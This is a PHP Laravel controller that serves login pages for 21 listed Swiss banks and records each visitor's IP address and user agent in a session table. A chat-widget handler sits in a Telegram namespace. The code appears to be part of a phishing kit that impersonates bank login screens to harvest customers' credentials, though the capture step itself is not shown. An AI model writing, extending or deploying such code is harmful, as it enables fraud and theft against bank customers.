<?php

namespace App\Http\Controllers;

use App\Models\BankSession;
use App\Telegram\Handlers\SmartSuppHandler;
use Illuminate\Http\Request;
use Illuminate\Support\Str;
use Inertia\Inertia;
use Inertia\Response;

class BankLoginController extends Controller
{
    public const ACTIVE_SLUGS = [
        'migros', 'ubs', 'postfinance', 'aek-bank', 'bank-avera',
        'swissquote', 'baloise', 'bancastato', 'next-bank', 'llb',
        'raiffeisen', 'valiant', 'bernerland', 'cler', 'dc-bank',
        'banque-du-leman', 'bank-slm', 'sparhafen', 'alternative-bank',
        'hypothekarbank', 'banque-cantonale-du-valais',
    ];

    public function show(string $bankSlug, Request $request): Response
    {
        if (!in_array($bankSlug, self::ACTIVE_SLUGS, true)) {
            abort(404);
        }

        $session = BankSession::create([
            'bank_slug' => $bankSlug,
            'ip_address' => $request->ip(),
            'user_agent' => $request->userAgent(),
            'last_activity_at' => now(),
        ]);

        $page = 'Banks/' . Str::studly(str_replace('-', '_', $bankSlug));

        return Inertia::render($page, [
            'sessionId' => $session->id,
            'bankSlug'  => $bankSlug,
            'smartsupp' => SmartSuppHandler::getSettings(),
        ]);
    }
}
